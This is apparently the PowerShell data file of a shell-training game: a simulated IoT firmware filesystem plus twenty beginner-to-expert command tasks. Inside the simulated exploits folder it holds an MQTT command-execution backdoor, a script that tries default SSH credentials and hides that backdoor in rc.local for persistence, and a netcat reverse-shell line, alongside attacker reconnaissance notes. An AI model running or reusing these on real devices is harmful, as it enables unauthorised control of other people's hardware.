function Get-LearningContent-iot {
    $fs = @{
            'home' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'hacker' = @{
                        Type = 'dir'; Owner = 'hacker'; Group = 'hacker'
                        Children = @{
                            'firmware' = @{
                                Type = 'dir'; Owner = 'hacker'; Group = 'hacker'
                                Children = @{
                                    'rootfs' = @{
                                        Type = 'dir'; Owner = 'hacker'; Group = 'hacker'
                                        Children = @{
                                            'bin' = @{
                                                Type = 'dir'; Owner = 'root'; Group = 'root'
                                                Children = @{
                                                    'busybox' = @{
                                                        Type = 'file'; Owner = 'root'; Group = 'root'
                                                        Content = @('#!/bin/busybox', 'BusyBox v1.36.1 multi-call binary')
                                                    }
                                                }
                                            }
                                            'etc' = @{
                                                Type = 'dir'; Owner = 'root'; Group = 'root'
                                                Children = @{
                                                    'inittab' = @{
                                                        Type = 'file'; Owner = 'root'; Group = 'root'
                                                        Content = @(
                                                            '# Boot configuration for embedded device',
                                                            '::sysinit:/etc/init.d/rcS S boot',
                                                            '::shutdown:/etc/init.d/rcS K shutdown',
                                                            'console::askfirst:-/bin/sh',
                                                            'ttyS0::respawn:/sbin/getty -L ttyS0 115200 vt100',
                                                            'ttyAMA0::respawn:/sbin/getty -L ttyAMA0 115200 vt100'
                                                        )
                                                    }
                                                    'config' = @{
                                                        Type = 'dir'; Owner = 'root'; Group = 'root'
                                                        Children = @{
                                                            'wireless' = @{
                                                                Type = 'file'; Owner = 'root'; Group = 'root'
                                                                Content = @(
                                                                    '# UCI wireless configuration',
                                                                    "config wifi-device 'radio0'",
                                                                    "    option type 'mac80211'",
                                                                    "    option channel '6'",
                                                                    "    option hwmode '11g'",
                                                                    "    option htmode 'HT20'",
                                                                    "    option disabled '0'",
                                                                    '',
                                                                    "config wifi-iface 'default_radio0'",
                                                                    "    option device 'radio0'",
                                                                    "    option network 'lan'",
                                                                    "    option mode 'ap'",
                                                                    "    option ssid 'IoT_Device_42'",
                                                                    "    option encryption 'psk2'",
                                                                    "    option key '1234567890'",
                                                                    "    option wpa_group_rekey '3600'",
                                                                    '',
                                                                    "config wifi-iface 'guest_radio0'",
                                                                    "    option device 'radio0'",
                                                                    "    option network 'guest'",
                                                                    "    option mode 'ap'",
                                                                    "    option ssid 'IoT_Guest'",
                                                                    "    option encryption 'none'",
                                                                    "    option isolated '1'"
                                                                )
                                                            }
                                                            'network' = @{
                                                                Type = 'file'; Owner = 'root'; Group = 'root'
                                                                Content = @(
                                                                    '# UCI network configuration',
                                                                    "config interface 'loopback'",
                                                                    "    option ifname 'lo'",
                                                                    "    option proto 'static'",
                                                                    "    option ipaddr '127.0.0.1'",
                                                                    "    option netmask '255.0.0.0'",
                                                                    '',
                                                                    "config interface 'lan'",
                                                                    "    option ifname 'eth0'",
                                                                    "    option proto 'static'",
                                                                    "    option ipaddr '192.168.1.1'",
                                                                    "    option netmask '255.255.255.0'",
                                                                    "    option gateway '192.168.1.254'",
                                                                    "    option dns '8.8.8.8'",
                                                                    '',
                                                                    "config interface 'guest'",
                                                                    "    option ifname 'eth1'",
                                                                    "    option proto 'dhcp'"
                                                                )
                                                            }
                                                            'dhcp' = @{
                                                                Type = 'file'; Owner = 'root'; Group = 'root'
                                                                Content = @(
                                                                    '# UCI DHCP configuration',
                                                                    "config dnsmasq",
                                                                    "    option domainneeded '1'",
                                                                    "    option localservice '1'",
                                                                    "    option port '53'",
                                                                    "    option resolvfile '/tmp/resolv.conf.auto'",
                                                                    '',
                                                                    "config dhcp 'lan'",
                                                                    "    option interface 'lan'",
                                                                    "    option start '100'",
                                                                    "    option limit '150'",
                                                                    "    option leasetime '12h'",
                                                                    "    option dhcpv4 'server'",
                                                                    '',
                                                                    "config dhcp 'guest'",
                                                                    "    option interface 'guest'",
                                                                    "    option start '10'",
                                                                    "    option limit '50'",
                                                                    "    option leasetime '1h'"
                                                                )
                                                            }
                                                            'system' = @{
                                                                Type = 'file'; Owner = 'root'; Group = 'root'
                                                                Content = @(
                                                                    '# UCI system configuration',
                                                                    "config system",
                                                                    "    option hostname 'iot-sensor-01'",
                                                                    "    option timezone 'UTC'",
                                                                    "    option zonename 'Etc/UTC'",
                                                                    "    option log_proto 'udp'",
                                                                    "    option log_ip '192.168.1.100'",
                                                                    "    option log_port '514'",
                                                                    "    option cronloglevel '8'",
                                                                    '',
                                                                    "config timeserver 'ntp'",
                                                                    "    list server 'pool.ntp.org'",
                                                                    "    list server 'time.google.com'",
                                                                    "    option enabled '1'",
                                                                    "    option enable_server '0'"
                                                                )
                                                            }
                                                        }
                                                    }
                                                    'hosts' = @{
                                                        Type = 'file'; Owner = 'root'; Group = 'root'
                                                        Content = @(
                                                            '127.0.0.1 localhost',
                                                            '192.168.1.1 iot-sensor-01',
                                                            '192.168.1.2 iot-camera-02',
                                                            '192.168.1.3 iot-hub-main',
                                                            '10.0.0.1 cloud-backend.internal'
                                                        )
                                                    }
                                                }
                                            }
                                            'usr' = @{
                                                Type = 'dir'; Owner = 'root'; Group = 'root'
                                                Children = @{
                                                    'sbin' = @{
                                                        Type = 'dir'; Owner = 'root'; Group = 'root'
                                                        Children = @{
                                                            'dropbear' = @{
                                                                Type = 'file'; Owner = 'root'; Group = 'root'
                                                                Content = @('Dropbear SSH server v2024.84')
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    'kernel_bin' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'Linux kernel image v5.15.148',
                                            'Architecture: ARM (little endian)',
                                            'Compressed: LZMA',
                                            'Size: 3,456,012 bytes',
                                            'Load address: 0x80008000',
                                            'Entry point: 0x80008040',
                                            'DTB appended: yes'
                                        )
                                    }
                                    'filesystem_squashfs' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'Squashfs filesystem v4.0',
                                            'Little endian, LZMA compression',
                                            'Size: 12,456,320 bytes',
                                            'Original size: 48,123,456 bytes',
                                            'Inodes: 2456',
                                            'Created: Fri Jun 5 12:00:00 2026'
                                        )
                                    }
                                    'bootloader_bin' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'U-Boot bootloader 2024.01',
                                            'Board: Generic ARM Cortex-A7',
                                            'DRAM: 256 MB',
                                            'MMC: mmc@7800000: 0',
                                            'Flash: 32 MB SPI NOR',
                                            '',
                                            'Partitions:',
                                            '  mtd0: 0x00000000-0x00040000 (256K) - u-boot',
                                            '  mtd1: 0x00040000-0x00050000 (64K)  - u-boot-env',
                                            '  mtd2: 0x00050000-0x00250000 (2M)  - kernel',
                                            '  mtd3: 0x00250000-0x01E50000 (28M) - rootfs',
                                            '',
                                            'Bootargs: console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs',
                                            'Bootcmd: sf read 0x80800000 0x50000 0x200000; bootm 0x80800000'
                                        )
                                    }
                                    'config_bin' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'Device configuration block',
                                            'Product: IoT Sensor v3',
                                            'Vendor: SmartHome Corp',
                                            'Serial: SH-2026-A42B',
                                            'MAC: 00:1A:2B:3C:4D:5E',
                                            'Firmware: 2.1.4',
                                            'Build: 2026-05-20',
                                            'Hardware rev: C',
                                            'Root password hash: $1$abcdefgh$XXXXXXXXXXXXXX',
                                            'Cloud API key: api_XXXXXXXXXXXXXXXXXXXXXXXX',
                                            'MQTT broker: mqtt.cloud-backend.internal:8883',
                                            'Update server: https://ota.smarthome-corp.com/v3/'
                                        )
                                    }
                                }
                            }
                            'exploits' = @{
                                Type = 'dir'; Owner = 'hacker'; Group = 'hacker'
                                Children = @{
                                    'payload_py' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            '#!/usr/bin/env python3',
                                            '# MQTT reverse shell payload',
                                            'import paho.mqtt.client as mqtt',
                                            'import subprocess',
                                            'import os',
                                            'server = "192.168.1.100"',
                                            'topic = "iot/cmd/sensor-42"',
                                            'def on_message(client, userdata, msg):',
                                            '    cmd = msg.payload.decode()',
                                            '    result = subprocess.check_output(cmd, shell=True)',
                                            '    client.publish("iot/output/sensor-42", result)',
                                            'client = mqtt.Client()',
                                            'client.on_message = on_message',
                                            'client.connect(server, 1883, 60)',
                                            'client.subscribe(topic)',
                                            'client.loop_forever()'
                                        )
                                    }
                                    'shellcode_bin' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'ARM (Thumb) shellcode for bind shell on port 4444',
                                            'Length: 124 bytes',
                                            '00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F',
                                            '10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F',
                                            '20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F',
                                            '30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F',
                                            '40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F',
                                            '50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F',
                                            '60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F',
                                            '70 71 72 73 74 75 76 77 78 79 7A 7B 7C'
                                        )
                                    }
                                    'exploit_sh' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            '#!/bin/bash',
                                            '# IoT device exploit launcher',
                                            'TARGET=$1',
                                            'PORT=${2:-22}',
                                            'echo "[*] Deploying payload to $TARGET:$PORT"',
                                            'echo "[*] Checking for default credentials..."',
                                            'sshpass -p "admin:admin" ssh -o StrictHostKeyChecking=no root@$TARGET "id"',
                                            'if [ $? -eq 0 ]; then',
                                            '    echo "[+] Default credentials work!"',
                                            '    echo "[*] Uploading persistence payload..."',
                                            '    scp payload.py root@$TARGET:/tmp/.syslogd.py',
                                            '    ssh root@$TARGET "echo /usr/bin/python3 /tmp/.syslogd.py & >> /etc/rc.local"',
                                            '    echo "[+] Persistence established"',
                                            'else',
                                            '    echo "[-] Default credentials failed, trying alternative methods"',
                                            '    echo "[*] Attempting UART backdoor..."',
                                            '    screen /dev/ttyUSB0 115200',
                                            'fi'
                                        )
                                    }
                                    'nc' = @{
                                        Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                        Content = @(
                                            'Netcat static binary for ARM',
                                            'BusyBox nc variant',
                                            'Usage: nc -l -p 4444 (listen)',
                                            '       nc target_ip 22 (connect)',
                                            '       nc -e /bin/sh target_ip 4444 (reverse shell)'
                                        )
                                    }
                                }
                            }
                            'notes_txt' = @{
                                Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                Content = @(
                                    'IoT Target Reconnaissance Notes',
                                    '==============================',
                                    'Target: SmartHome Corp IoT Sensor v3',
                                    'Firmware obtained from OTA update intercept',
                                    '',
                                    'Key observations:',
                                    '- Default credentials likely admin:admin',
                                    '- MQTT broker on cloud-backend.internal:8883',
                                    '- No TLS on local network MQTT (port 1883)',
                                    '- Open ports: 22 (dropbear), 80 (http), 443 (https)',
                                    '- UART exposed on PCB (J3 header, 115200 baud)',
                                    '- Flash: 32MB SPI NOR, no tamper detection',
                                    '- Cloud API key found in config.bin',
                                    '',
                                    'Attack vectors:',
                                    '1. Firmware extraction via UART boot interrupt',
                                    '2. Default credential login via SSH',
                                    '3. MQTT injection on local network',
                                    '4. Cloud API key abuse',
                                    '',
                                    'Next steps:',
                                    '- Extract rootfs.squashfs and analyze filesystem',
                                    '- Check for hardcoded credentials in binaries',
                                    '- Identify writable partitions for persistence'
                                )
                            }
                            '.bashrc' = @{
                                Type = 'file'; Owner = 'hacker'; Group = 'hacker'
                                Content = @(
                                    '# Hacker bash configuration',
                                    "export PS1='\[\e[31m\]\u@iot-hack\[\e[0m\]:\w\$ '",
                                    'alias ll="ls -alF"',
                                    'alias la="ls -A"',
                                    'alias grep="grep --color=auto"',
                                    'alias fw="cd /home/hacker/firmware"',
                                    'alias exploit="cd /home/hacker/exploits"',
                                    'alias scan="for i in 192.168.1.{1..254}; do ping -c 1 -W 1 \$i &>/dev/null && echo \$i alive; done"',
                                    'alias extract="unsquashfs /home/hacker/firmware/filesystem.squashfs"',
                                    'export PATH=$PATH:/home/hacker/exploits'
                                )
                            }
                        }
                    }
                }
            }
            'dev' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'ttyS0' = @{
                        Type = 'file'; Owner = 'root'; Group = 'dialout'
                        Content = @('UART serial port device @ 115200 baud')
                    }
                    'ttyAMA0' = @{
                        Type = 'file'; Owner = 'root'; Group = 'dialout'
                        Content = @('ARM AMBA serial port @ 115200 baud')
                    }
                    'mmcblk0' = @{
                        Type = 'file'; Owner = 'root'; Group = 'disk'
                        Content = @('eMMC block device - 8 GB total')
                    }
                    'mtdblock0' = @{
                        Type = 'file'; Owner = 'root'; Group = 'disk'
                        Content = @('MTD block 0: u-boot partition (256K)')
                    }
                    'mtdblock1' = @{
                        Type = 'file'; Owner = 'root'; Group = 'disk'
                        Content = @('MTD block 1: u-boot-env partition (64K)')
                    }
                    'mtdblock2' = @{
                        Type = 'file'; Owner = 'root'; Group = 'disk'
                        Content = @('MTD block 2: kernel partition (2M)')
                    }
                    'mtdblock3' = @{
                        Type = 'file'; Owner = 'root'; Group = 'disk'
                        Content = @('MTD block 3: rootfs partition (28M)')
                    }
                }
            }
            'proc' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'cpuinfo' = @{
                        Type = 'file'; Owner = 'root'; Group = 'root'
                        Content = @(
                            'processor       : 0',
                            'model name      : ARM Cortex-A7',
                            'Features        : half thumb fastmult vfp edsp neon vfpv3',
                            'CPU architecture: 7',
                            'CPU variant     : 0x0',
                            'CPU part        : 0xc07',
                            'CPU revision    : 3',
                            '',
                            'processor       : 1',
                            'model name      : ARM Cortex-A7',
                            'CPU architecture: 7',
                            'CPU variant     : 0x0',
                            'CPU part        : 0xc07',
                            'CPU revision    : 3',
                            '',
                            'Hardware        : Generic ARM Cortex-A7 (Device Tree)',
                            'BogoMIPS        : 199.88',
                            'Features        : swp half thumb fastmult edsp neon',
                            'CPU implementer : 0x41',
                            'CPU architecture: 7'
                        )
                    }
                    'meminfo' = @{
                        Type = 'file'; Owner = 'root'; Group = 'root'
                        Content = @(
                            'MemTotal:       256000 kB',
                            'MemFree:         34120 kB',
                            'MemAvailable:    89200 kB',
                            'Buffers:          1240 kB',
                            'Cached:          54320 kB',
                            'SwapCached:          0 kB',
                            'Active:         123456 kB',
                            'Inactive:        78901 kB',
                            'Active(anon):    98765 kB',
                            'Inactive(anon):  12345 kB',
                            'Active(file):    24691 kB',
                            'Inactive(file):  66556 kB',
                            'SwapTotal:           0 kB',
                            'SwapFree:            0 kB',
                            'Dirty:             123 kB',
                            'Writeback:           0 kB',
                            'AnonPages:       98765 kB',
                            'Mapped:          45678 kB',
                            'Slab:            23456 kB',
                            'SReclaimable:    12345 kB',
                            'SUnreclaim:      11111 kB',
                            'PageTables:       1234 kB',
                            'NFS_Unstable:        0 kB',
                            'Bounce:              0 kB',
                            'WritebackTmp:        0 kB',
                            'CommitLimit:    128000 kB',
                            'Committed_AS:   300000 kB',
                            'VmallocTotal:   499456 kB',
                            'VmallocUsed:     12345 kB',
                            'VmallocChunk:   456789 kB'
                        )
                    }
                    'partitions' = @{
                        Type = 'file'; Owner = 'root'; Group = 'root'
                        Content = @(
                            'major minor  #blocks  name',
                            '',
                            ' 179        0    8388608 mmcblk0',
                            ' 179        1     262144 mmcblk0p1',
                            ' 179        2        512 mmcblk0p2',
                            ' 179        3    2097152 mmcblk0p3',
                            ' 179        4    6028800 mmcblk0p4',
                            '',
                            '  31        0        256 mtdblock0',
                            '  31        1         64 mtdblock1',
                            '  31        2       2048 mtdblock2',
                            '  31        3      28672 mtdblock3'
                        )
                    }
                }
            }
            'etc' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'hostname' = @{
                        Type = 'file'; Owner = 'root'; Group = 'root'
                        Content = @('iot-device')
                    }
                    'os_release' = @{
                        Type = 'file'; Owner = 'root'; Group = 'root'
                        Content = @(
                            'PRETTY_NAME="OpenWrt 23.05.3 (Embedded)"',
                            'NAME="OpenWrt"',
                            'VERSION="23.05.3"',
                            'ID="openwrt"',
                            'ID_LIKE="lede"',
                            'OPENWRT_BOARD="cortexa7"',
                            'OPENWRT_ARCH="arm_cortex-a7_neon-vfpv4"',
                            'OPENWRT_RELEASE="OpenWrt 23.05.3 r23497-6637af2d06"'
                        )
                    }
                }
            }
            'var' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'log' = @{
                        Type = 'dir'; Owner = 'root'; Group = 'root'
                        Children = @{
                            'syslog' = @{
                                Type = 'file'; Owner = 'root'; Group = 'adm'
                                Content = @(
                                    'Jan  1 00:00:00 iot-device kern.info kernel: Booting Linux on ARM Cortex-A7',
                                    'Jan  1 00:00:01 iot-device kern.info kernel: Memory: 256MB available',
                                    'Jan  1 00:00:02 iot-device kern.info kernel: Mounting rootfs squashfs filesystem',
                                    'Jan  1 00:00:03 iot-device kern.info kernel: mmc0: new high speed SDHC card at address 0x1234',
                                    'Jan  1 00:00:04 iot-device kern.info kernel: mtd: partition mtd0 (u-boot) at 0x00000000',
                                    'Jan  1 00:00:05 iot-device kern.info kernel: mtd: partition mtd1 (u-boot-env) at 0x00040000',
                                    'Jan  1 00:00:06 iot-device kern.info kernel: mtd: partition mtd2 (kernel) at 0x00050000',
                                    'Jan  1 00:00:07 iot-device kern.info kernel: mtd: partition mtd3 (rootfs) at 0x00250000',
                                    'Jan  1 00:00:08 iot-device kern.info kernel: UART: ttyS0 at MMIO 0x18000000 (irq = 20)',
                                    'Jan  1 00:00:08 iot-device kern.info kernel: UART: ttyAMA0 at MMIO 0x1C000000 (irq = 21)',
                                    'Jan  1 00:00:09 iot-device kern.info kernel: eth0: MAC 00:1A:2B:3C:4D:5E',
                                    'Jan  1 00:00:10 iot-device kern.info kernel: WiFi: radio0 enabled, channel 6',
                                    'Jan  1 00:00:11 iot-device kern.info init: Starting dropbear SSH daemon',
                                    'Jan  1 00:00:12 iot-device kern.info init: Starting dnsmasq DHCP server',
                                    'Jan  1 00:00:13 iot-device kern.info init: Starting MQTT client connector',
                                    'Jan  1 00:00:14 iot-device user.info mqtt: Connected to broker at mqtt.cloud-backend.internal:8883',
                                    'Jan  1 00:00:15 iot-device user.info mqtt: Subscribed to topic iot/data/sensor-42',
                                    'Jan  1 00:01:00 iot-device user.info mqtt: Published sensor reading temp=22.5C, humidity=45%',
                                    'Jan  1 00:02:00 iot-device user.info mqtt: Published sensor reading temp=22.6C, humidity=44%',
                                    'Jan  1 01:00:00 iot-device auth.info sshd: Connection from 192.168.1.100 port 54321',
                                    'Jan  1 01:00:01 iot-device auth.err sshd: Failed password for root from 192.168.1.100 port 54321',
                                    'Jan  1 01:00:02 iot-device auth.info sshd: Connection from 192.168.1.100 port 54322',
                                    'Jan  1 01:00:03 iot-device auth.err sshd: Failed password for root from 192.168.1.100 port 54322',
                                    'Jan  1 01:00:04 iot-device auth.info sshd: Connection from 10.0.0.50 port 44444',
                                    'Jan  1 01:00:05 iot-device auth.err sshd: Failed password for admin from 10.0.0.50 port 44444',
                                    'Jan  1 01:00:06 iot-device auth.err sshd: Failed password for admin from 10.0.0.50 port 44444',
                                    'Jan  1 01:00:07 iot-device auth.err sshd: Failed password for admin from 10.0.0.50 port 44444',
                                    'Jan  1 01:05:00 iot-device user.warn mqtt: Connection to mqtt.cloud-backend.internal lost',
                                    'Jan  1 01:05:01 iot-device user.warn mqtt: Reconnection attempt 1/5 failed',
                                    'Jan  1 01:05:30 iot-device user.err mqtt: MQTT broker unreachable after 5 retries',
                                    'Jan  1 01:06:00 iot-device daemon.info dnsmasq: query[A] cloud-backend.internal from 192.168.1.100',
                                    'Jan  1 01:06:01 iot-device daemon.info dnsmasq: forwarded cloud-backend.internal to 8.8.8.8',
                                    'Jan  1 02:00:00 iot-device user.info cron: Running daily firmware update check',
                                    'Jan  1 02:00:01 iot-device user.info cron: Firmware up to date (version 2.1.4)',
                                    'Jan  1 03:00:00 iot-device kern.info kernel: eth0: link up, 100Mbps, full-duplex'
                                )
                            }
                        }
                    }
                }
            }
            'tmp' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{}
            }
            'overlay' = @{
                Type = 'dir'; Owner = 'root'; Group = 'root'
                Children = @{
                    'upper' = @{
                        Type = 'dir'; Owner = 'root'; Group = 'root'
                        Children = @{}
                    }
                    'work' = @{
                        Type = 'dir'; Owner = 'root'; Group = 'root'
                        Children = @{}
                    }
                }
            }
    }

    $tasks = @(
        @{
            Id = 'iot-b1'
            Title = 'List firmware directory contents'
            Difficulty = 'beginner'
            ExpectedCommand = 'ls /home/hacker/firmware/'
            Description = @(
                'List the firmware directory to see the extracted components',
                'including kernel, filesystem, bootloader, and config.'
            )
            Hint = 'Use: ls /home/hacker/firmware/'
        }
        @{
            Id = 'iot-b2'
            Title = 'Check busybox applets'
            Difficulty = 'beginner'
            ExpectedCommand = 'ls /home/hacker/firmware/rootfs/bin/'
            Description = @(
                'List the bin directory in the extracted rootfs to see',
                'available busybox applets on the embedded Linux device.'
            )
            Hint = 'Use: ls /home/hacker/firmware/rootfs/bin/'
        }
        @{
            Id = 'iot-b3'
            Title = 'Read reconnaissance notes'
            Difficulty = 'beginner'
            ExpectedCommand = 'cat /home/hacker/notes_txt'
            Description = @(
                'Display the hacker notes file to understand the target',
                'device, attack vectors, and key observations.'
            )
            Hint = 'Use: cat /home/hacker/notes_txt'
        }
        @{
            Id = 'iot-b4'
            Title = 'List exploit payloads'
            Difficulty = 'beginner'
            ExpectedCommand = 'ls /home/hacker/exploits/'
            Description = @(
                'List the exploits directory to see available payloads',
                'including Python scripts, shellcode, and a netcat binary.'
            )
            Hint = 'Use: ls /home/hacker/exploits/'
        }
        @{
            Id = 'iot-b5'
            Title = 'View device init configuration'
            Difficulty = 'beginner'
            ExpectedCommand = 'cat /home/hacker/firmware/rootfs/etc/inittab'
            Description = @(
                'Display the inittab file to understand the boot process',
                'and serial console configuration of the embedded device.'
            )
            Hint = 'Use: cat /home/hacker/firmware/rootfs/etc/inittab'
        }
        @{
            Id = 'iot-i1'
            Title = 'View wireless configuration'
            Difficulty = 'intermediate'
            ExpectedCommand = 'cat /home/hacker/firmware/rootfs/etc/config/wireless'
            Description = @(
                'Display the OpenWrt wireless configuration to see SSID,',
                'encryption settings, and radio parameters.'
            )
            Hint = 'Use: cat /home/hacker/firmware/rootfs/etc/config/wireless'
        }
        @{
            Id = 'iot-i2'
            Title = 'Check CPU architecture'
            Difficulty = 'intermediate'
            ExpectedCommand = 'cat /proc/cpuinfo'
            Description = @(
                'Display the CPU information to determine the architecture',
                'and features of the embedded device processor.'
            )
            Hint = 'Use: cat /proc/cpuinfo'
        }
        @{
            Id = 'iot-i3'
            Title = 'Check memory layout'
            Difficulty = 'intermediate'
            ExpectedCommand = 'cat /proc/meminfo'
            Description = @(
                'Display memory info to see total RAM, available memory,',
                'and kernel memory allocation on the device.'
            )
            Hint = 'Use: cat /proc/meminfo'
        }
        @{
            Id = 'iot-i4'
            Title = 'View network configuration'
            Difficulty = 'intermediate'
            ExpectedCommand = 'cat /home/hacker/firmware/rootfs/etc/config/network'
            Description = @(
                'Display the OpenWrt network configuration to see interface',
                'settings, IP addresses, and DHCP configuration.'
            )
            Hint = 'Use: cat /home/hacker/firmware/rootfs/etc/config/network'
        }
        @{
            Id = 'iot-i5'
            Title = 'Search for UART references in syslog'
            Difficulty = 'intermediate'
            ExpectedCommand = 'grep UART /var/log/syslog'
            Description = @(
                'Search the system log for UART references to identify',
                'serial port configuration and addresses on the device.'
            )
            Hint = 'Use: grep UART /var/log/syslog'
        }
        @{
            Id = 'iot-a1'
            Title = 'Find all binary files in firmware'
            Difficulty = 'advanced'
            ExpectedCommand = 'find /home/hacker/firmware -name "*_bin" 2>/dev/null'
            Description = @(
                'Find all files ending in _bin within the firmware directory',
                'to locate kernel, bootloader, and other binary components.'
            )
            Hint = 'Use: find /home/hacker/firmware -name "*_bin" 2>/dev/null'
        }
        @{
            Id = 'iot-a2'
            Title = 'Read U-Boot bootloader config'
            Difficulty = 'advanced'
            ExpectedCommand = 'cat /home/hacker/firmware/bootloader_bin'
            Description = @(
                'Display the U-Boot bootloader information to see the',
                'flash layout, boot arguments, and memory configuration.'
            )
            Hint = 'Use: cat /home/hacker/firmware/bootloader_bin'
        }
        @{
            Id = 'iot-a3'
            Title = 'Check flash partition layout'
            Difficulty = 'advanced'
            ExpectedCommand = 'cat /proc/partitions'
            Description = @(
                'Display the kernel partition table to see all MTD and',
                'MMC block device partitions on the embedded system.'
            )
            Hint = 'Use: cat /proc/partitions'
        }
        @{
            Id = 'iot-a4'
            Title = 'Read system log for boot messages'
            Difficulty = 'advanced'
            ExpectedCommand = 'cat /var/log/syslog | head -20'
            Description = @(
                'Display the first 20 lines of the system log to review',
                'boot messages and initial device initialization.'
            )
            Hint = 'Use: cat /var/log/syslog | head -20'
        }
        @{
            Id = 'iot-a5'
            Title = 'Explore device hostnames'
            Difficulty = 'advanced'
            ExpectedCommand = 'cat /home/hacker/firmware/rootfs/etc/hosts'
            Description = @(
                'Display the hosts file from the extracted rootfs to',
                'discover device names and IP addresses on the network.'
            )
            Hint = 'Use: cat /home/hacker/firmware/rootfs/etc/hosts'
        }
        @{
            Id = 'iot-e1'
            Title = 'Analyze syslog authentication failures'
            Difficulty = 'expert'
            ExpectedCommand = 'grep "Failed password" /var/log/syslog | sort | uniq -c'
            Description = @(
                'Extract all failed password attempts from the syslog and',
                'count unique occurrences to identify brute force attack patterns.'
            )
            Hint = 'Use: grep "Failed password" /var/log/syslog | sort | uniq -c'
        }
        @{
            Id = 'iot-e2'
            Title = 'Create compressed archive of extracted firmware'
            Difficulty = 'expert'
            ExpectedCommand = 'tar -czf firmware_archive.tar.gz -C /home/hacker/firmware/rootfs .'
            Description = @(
                'Create a gzipped tar archive of the extracted firmware',
                'rootfs for analysis on other systems or as a backup.'
            )
            Hint = 'Use: tar -czf firmware_archive.tar.gz -C /home/hacker/firmware/rootfs .'
        }
        @{
            Id = 'iot-e3'
            Title = 'Find writable locations in rootfs'
            Difficulty = 'expert'
            ExpectedCommand = 'find /home/hacker/firmware/rootfs -perm -2000 -o -perm -4000 2>/dev/null'
            Description = @(
                'Search for setuid and setgid binaries in the extracted',
                'firmware that could be exploited for privilege escalation.'
            )
            Hint = 'Use: find /home/hacker/firmware/rootfs -perm -2000 -o -perm -4000 2>/dev/null'
        }
        @{
            Id = 'iot-e4'
            Title = 'Compare MTD partition sizes'
            Difficulty = 'expert'
            ExpectedCommand = 'cat /proc/partitions | grep mtd'
            Description = @(
                'Extract only MTD partition entries from the partitions file',
                'to analyze the flash memory layout and partition sizes.'
            )
            Hint = 'Use: cat /proc/partitions | grep mtd'
        }
        @{
            Id = 'iot-e5'
            Title = 'Calculate firmware rootfs disk usage'
            Difficulty = 'expert'
            ExpectedCommand = 'du -sh /home/hacker/firmware/rootfs'
            Description = @(
                'Calculate the total disk space used by the extracted',
                'firmware rootfs to estimate flash storage requirements.'
            )
            Hint = 'Use: du -sh /home/hacker/firmware/rootfs'
        }
    )

    return @{ Filesystem = $fs; Tasks = $tasks }
}
